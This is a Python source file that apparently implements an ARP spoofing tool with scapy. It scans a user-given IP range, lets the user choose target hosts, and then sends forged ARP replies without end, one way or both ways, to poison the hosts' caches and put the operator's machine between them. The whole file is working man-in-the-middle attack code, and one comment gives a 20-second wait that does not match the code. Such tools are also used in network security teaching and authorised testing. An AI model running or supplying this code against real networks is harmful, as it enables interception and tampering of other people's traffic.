from scapy.all import *
import threading

class arp():

    def __init__(self, interface):
        self.interface = interface

    def getInput(self):
        #user enters what IP range to use
        self.ip_range = raw_input("Enter the range of IP addresses that you want to use (example: 192.168.5.85/24): ")
        
        #sends ARP packets to all ips in the range, -> we now know which ips are taken, and the MAC-address corresponding with every IP
        self.ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = self.ip_range), timeout=3, iface=self.interface)

        print("We received the following responses: ")
        index = 0
        print(" \t\t IP: \t MAC:")
        for packet_sent, packet_received in self.ips_used:
            print("{} \t {} \t {}".format(index, packet_received[ARP].psrc, packet_received[ARP].hwsrc))
            index = index + 1
    
        self.target = []
        #now we will select the targets
        mult_target = raw_input("Do you want to select targets manually (y) or select all IP's automatically (n): ")
        #case user manually selects targets
        if(mult_target == "y"):
            print("Enter the index nr of the targets you want to add to the target list, to quit entering input 'quit'")
            input = ""
            while(input != "quit"):
                input = raw_input()
                if(input != "quit"):
                    inputInt = int(input)
                    self.target.append({"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
        else:
            for packet_sent, packet_received in self.ips_used:
                self.target.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
        #print(self.target)

        self.target2 = []
        #now we will select the target2
        mult_target = raw_input("Do you want to select target2 manually (y) or select all IP's automatically (n): ")
        #case user manually selects target2
        if(mult_target == "y"):
            print("Enter the index nr of the target you want to add to the target2 list, to quit entering input 'quit'")
            input = ""
            while(input != "quit"):
                input = raw_input()
                if(input != "quit"):
                    inputInt = int(input)
                    self.target2.append({"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
        else:
            for packet_sent, packet_received in self.ips_used:
                self.target2.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
        #print(self.target2)
        
        #get own MAC address
        self.ownMAC = get_if_hwaddr(self.interface)

        #direction of the poisoning
        self.direction = ""
        while(self.direction != "y" and self.direction != "n"):
            self.direction = raw_input("Select bidirectional poisoning (y) or directional poisoning (n): ")
            if(self.direction != "y" and self.direction != "n"):
                print("Enter a valid input!")

    def startProcess(self):
        #Now we will create and send the arp packets which will poison the caches.
        while True:
            for tar1 in self.target:
                for tar2 in self.target2:
                    if((tar1["ip"] != tar2["ip"]) and (tar1["mac"] != tar2["mac"])):
                        arp_packet1 = Ether(src=self.ownMAC) / ARP(psrc=tar2["ip"], hwsrc=self.ownMAC, pdst=tar1["ip"], hwdst=tar1["mac"]) 
                        sendp(arp_packet1, iface=self.interface)
                        if(self.direction == "y"):
                            arp_packet2 = Ether(src=self.ownMAC) / ARP(psrc=tar1["ip"], hwsrc=self.ownMAC, pdst=tar2["ip"], hwdst=tar2["mac"])
                            sendp(arp_packet2, iface=self.interface)
                #waits 20 seconds before the next spoof
            time.sleep(10)

    def setInput(self, ip_range, ips_used, target, target2, ownMAC, direction):
        self.ip_range = ip_range
        self.ips_used = ips_used
        self.target = target
        self.target2 = target2
        self.ownMAC = ownMAC
        self.direction = direction
        
